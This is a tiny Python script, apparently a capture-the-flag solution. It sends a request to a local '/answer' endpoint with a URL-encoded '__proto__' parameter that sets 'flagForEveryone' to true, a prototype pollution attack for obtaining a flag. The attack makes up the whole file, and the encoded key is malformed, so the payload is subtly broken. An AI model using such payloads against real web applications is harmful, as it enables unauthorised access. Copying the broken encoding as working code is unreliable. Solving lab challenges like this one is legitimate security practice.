#!/usr/bin/python3

import urllib3
http = urllib3.PoolManager()

r = http.request("GET", "http://localhost:8000/answer", fields={"answer":"Its-none-of-your-business","%5f%5fproto5f%5f%5f":{"flagForEveryone":True}})
print(r.data)
